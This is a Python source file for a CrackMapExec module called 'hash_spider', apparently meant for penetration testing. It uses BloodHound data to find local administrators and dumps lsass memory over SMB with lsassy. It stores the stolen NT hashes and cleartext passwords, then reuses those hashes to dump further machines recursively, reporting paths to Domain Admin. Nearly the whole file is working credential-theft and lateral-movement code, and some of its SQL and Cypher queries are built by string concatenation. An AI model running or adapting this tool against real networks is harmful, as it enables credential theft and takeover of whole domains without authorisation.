# Author:
# Peter Gorman @hackerm00n on Twitter

import configparser
from ctypes import create_unicode_buffer
from operator import contains
from types import MethodType

from urllib3 import Retry
from neo4j import GraphDatabase, basic_auth
from neo4j.exceptions import AuthError, ServiceUnavailable
import sqlite3
import sys
import os
from cme.modules.lsassy_dump import CMEModule as lsassy
from cme.logger import CMEAdapter
from lsassy import logger
from lsassy.dumper import Dumper
from lsassy.parser import Parser
from lsassy.session import Session
from lsassy.impacketfile import ImpacketFile

config = configparser.ConfigParser()
cme_path = os.path.expanduser('~/.cme')
config.read(os.path.join(cme_path, 'cme.conf'))
neo4j_user = config.get('BloodHound', 'bh_user')
neo4j_pass = config.get('BloodHound', 'bh_pass')
neo4j_uri = config.get('BloodHound', 'bh_uri')
neo4j_port = config.get('BloodHound', 'bh_port')
neo4j_db = "bolt://" + neo4j_uri + ":" + neo4j_port 
driver = GraphDatabase.driver(neo4j_db, auth = basic_auth(neo4j_user, neo4j_pass), encrypted=False)
db_path = os.path.expanduser("~/.cme/workspaces/default/hash_spider.sqlite3")
dbconnection = sqlite3.connect(db_path, check_same_thread=False, isolation_level=None)
cursor = dbconnection.cursor()
credentials_data = []
admin_results = []
found_users = []
reported_da = []


def neo4j_conn(context):
    if config.get('BloodHound', 'bh_enabled') != "False":
        context.log.info("Connecting to Neo4j/Bloodhound.")
        try:
            session = driver.session()
            list(session.run("MATCH (g:Group) return g"))
            context.log.info("Connection Successful!")
        except AuthError as e:
            context.log.error("Invalid credentials.")
        except ServiceUnavailable as e:
            context.log.error("Could not connect to neo4j database.")
        except Exception:
            context.log.error("Error querying domain admins")
    else:
        context.log.highlight("BloodHound not marked enabled. Check cme.conf")
        sys.exit()

def neo4j_local_admins(context):
    global admin_results
    try:
        session = driver.session()
        admins = session.run("MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c) WITH COLLECT(u1) + COLLECT(u2) AS TempVar,c UNWIND TempVar AS Admins RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT,COLLECT(DISTINCT(Admins.name)) AS USERS ORDER BY ADMIN_COUNT DESC")
        context.log.info("Admins and PCs obtained.")
    except Exception:
        context.log.error("Could not pull admins.")
        sys.exit()
    admin_results = [record for record in admins.data()]

def create_db(local_admins):
    cursor.execute('''CREATE TABLE if not exists pc_and_admins ("pc_name" TEXT UNIQUE, "local_admins" TEXT, "dumped" TEXT)''')
    for result in local_admins:
        cursor.execute("INSERT OR IGNORE INTO pc_and_admins(pc_name, local_admins, dumped) VALUES(?, ?, ?)", (result.get('COMPUTER'),str(result.get('USERS'),),'FALSE'))
    dbconnection.commit()
    cursor.execute('''CREATE TABLE if not exists admin_users("username" TEXT UNIQUE, "hash" TEXT, "password" TEXT)''')
    admin_users = []
    for result in local_admins:
        for user in result.get('USERS'):
            if user not in admin_users:
                admin_users.append(user)
    for user in admin_users:
        cursor.execute('''INSERT OR IGNORE INTO admin_users(username) VALUES(?)''', [user])
    dbconnection.commit()

def process_creds(context, connection, credentials_data):
    for result in credentials_data:
        username = result["username"].upper().split('@')[0]
        nthash = result["nthash"]
        password = result["password"]
        if result["password"] != None:
            context.log.success(f"Found a cleartext password for: {username}:{password} on {connection.host}. Adding to the DB and marking user as owned in BH.")
            cursor.execute("UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'", [password])
            username = (f"{username.upper()}@{connection.domain.upper()}")
            dbconnection.commit()
            session = driver.session()
            session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
        if nthash == 'aad3b435b51404eeaad3b435b51404ee' or nthash =='31d6cfe0d16ae931b73c59d7e0c089c0':
            context.log.error(f"Hash for {username} is expired.")
        elif username not in found_users and nthash != None:
            context.log.success(f"Found hashes for: {username}:{nthash} on {connection.hostname}. Adding them to the DB and marking user as owned in BH.")
            found_users.append(username)
            cursor.execute("UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'", [nthash])
            dbconnection.commit()
            username = (f"{username.upper()}@{connection.domain.upper()}")
            session = driver.session()
            session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
            path_to_da = session.run("MATCH p=shortestPath((n)-[*1..]->(m)) WHERE exists(n.owned) AND m.name=~ '.*DOMAIN ADMINS.*' RETURN p")
            paths = [record for record in path_to_da.data()]
            for path in paths:
                if path:
                    for key,value in path.items():
                        for item in value:
                            if type(item) == dict:
                                if {item['name']} not in reported_da:
                                    context.log.success(f"You have a valid path to DA as {item['name']}.")
                                    reported_da.append({item['name']})
                                sys.exit()
            
class CMEModule:
    name = 'hash_spider'
    description = "Dump lsass recursively from a given hash using BH to find local admins"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
            METHOD              Method to use to dump lsass.exe with lsassy
        """
        self.method = 'comsvcs'
        if 'METHOD' in module_options:
            self.method = module_options['METHOD']

    def run_lsassy(self, context, connection): # Couldn't figure out how to properly retrieve output from the module without editing. Blatantly ripped from lsassy_dump.py. Thanks pixis - @hackanddo!
        logger.init(quiet=True)
        host = connection.host
        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")
        session = Session()
        session.get_session(
            address=host,
            target_ip=host,
            port=445,
            lmhash=lmhash,
            nthash=nthash,
            username=username,
            password=password,
            domain=domain_name
        )
        if session.smb_session is None:
            context.log.error("Couldn't connect to remote host")
            return False
        dumper = Dumper(session, timeout=10).load(self.method)
        if dumper is None:
            context.log.error("Unable to load dump method '{}'".format(self.method))
            return False
        file = dumper.dump()
        if file is None:
            context.log.error("Unable to dump lsass")
            return False

        credentials, tickets = Parser(file).parse()
        file.close()
        ImpacketFile.delete(session, file.get_file_path())
        if credentials is None:
            credentials = []
        credentials = [cred.get_object() for cred in credentials if not cred.get_username().endswith("$")]
        credentials_unique = []
        credentials_output = []
        for cred in credentials:
            if [cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]] not in credentials_unique:
                credentials_unique.append([cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]])
                credentials_output.append(cred)
        global credentials_data
        credentials_data = credentials_output

    def spider_pcs(self, context, connection):
        cursor.execute("SELECT * from admin_users WHERE hash is not NULL")
        compromised_users = cursor.fetchall()
        cursor.execute("SELECT pc_name,local_admins FROM pc_and_admins WHERE dumped LIKE 'FALSE'")
        admin_access = cursor.fetchall()
        for user in compromised_users:
            for pc in admin_access:
                if user[0] in pc[1]:
                    cursor.execute(f"SELECT * FROM pc_and_admins WHERE pc_name = '{pc[0]}' AND dumped NOT LIKE 'TRUE'")
                    more_to_dump = cursor.fetchall()
                    if len(more_to_dump) > 0:
                        context.log.info(f"User {user[0]} has more access to {pc[0]}. Dumping with hash {user[1]}")
                        setattr(connection, "host", pc[0].split('.')[0])
                        setattr(connection, "username", user[0].split('@')[0])
                        setattr(connection, "nthash", user[1])
                        try:
                            self.run_lsassy(context, connection)
                            cursor.execute("UPDATE pc_and_admins SET dumped = 'TRUE' WHERE pc_name LIKE '" + pc[0] + "%'")
                        except Exception:
                            context.log.error(f"Failed to dump lsassy on {pc[0]}")
                        process_creds(context, connection, credentials_data)
                        self.spider_pcs(context, connection)
        if len(admin_access) > 0:
            context.log.error("No more local admin access known. Please try re-running Bloodhound with newly found accounts.")
            sys.exit()
        
    def on_admin_login(self, context, connection):
        neo4j_conn(context)
        neo4j_local_admins(context)
        create_db(admin_results)
        context.log.info("Running lsassy.")
        self.run_lsassy(context, connection)
        process_creds(context, connection, credentials_data)
        context.log.info("🕷️ Starting to spider. 🕷️")
        self.spider_pcs(context, connection)
